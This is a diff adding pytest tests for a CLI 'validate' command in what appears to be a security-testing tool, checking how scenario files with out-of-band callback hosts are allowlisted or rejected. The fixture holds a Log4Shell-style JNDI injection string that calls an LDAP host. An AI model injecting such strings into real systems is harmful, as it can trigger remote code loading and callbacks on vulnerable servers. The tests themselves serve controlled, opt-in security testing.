@@ -929,6 +929,49 @@ class TestAdversarialPayloadValidateCLI:
         )
         assert runner.invoke(app, ["validate", str(bad)]).exit_code == 2
 
+    def _write_literal_oob_scenario(self, tmp_path) -> Path:
+        import yaml
+
+        scenario = _linux_scenario(
+            [
+                {
+                    "type": "adversarial_payload",
+                    "surface": "syslog_message",
+                    "value": "EFORGE_TEST ${jndi:ldap://abc.oast.fun/EFORGE_TEST}",
+                }
+            ]
+        )
+        path = tmp_path / "literal_oob.yaml"
+        path.write_text(yaml.safe_dump(scenario))
+        return path
+
+    def test_validate_literal_oob_rejected_without_oob_host(self, tmp_path):
+        # A literal value pointing at an operator OOB host is a non-allowlisted host by
+        # default, so standalone validate flags it as a cross-reference error (exit 2).
+        path = self._write_literal_oob_scenario(tmp_path)
+        assert runner.invoke(app, ["validate", str(path)]).exit_code == 2
+
+    def test_validate_literal_oob_accepted_with_oob_host(self, tmp_path):
+        # Parity with `generate --oob-host`: registering the host allowlists it so the same
+        # scenario validates clean (exit 0).
+        path = self._write_literal_oob_scenario(tmp_path)
+        result = runner.invoke(app, ["validate", str(path), "--oob-host", "abc.oast.fun"])
+        assert result.exit_code == 0
+
+    def test_validate_oob_host_rejects_malformed_fast(self, tmp_path):
+        # The validate --oob-host contract is identical to generate's: a non-bare value is
+        # rejected at the boundary (exit 1) before the scenario is loaded.
+        path = self._write_literal_oob_scenario(tmp_path)
+        result = runner.invoke(app, ["validate", str(path), "--oob-host", "http://x/y"])
+        assert result.exit_code == 1
+        assert "bare host" in result.output.lower()
+
+    def test_validate_oob_host_rejects_non_registrable_fast(self, tmp_path):
+        path = self._write_literal_oob_scenario(tmp_path)
+        result = runner.invoke(app, ["validate", str(path), "--oob-host", "com"])
+        assert result.exit_code == 1
+        assert "registrable" in result.output.lower()
+
     def test_generate_oob_host_alone_enables_live_callback(self, scenarios_dir, tmp_path):
         # --oob-host is now the explicit opt-in (no separate --i-am-authorized flag): it is
         # accepted on its own and prints the loud LIVE CALLBACK MODE warning.
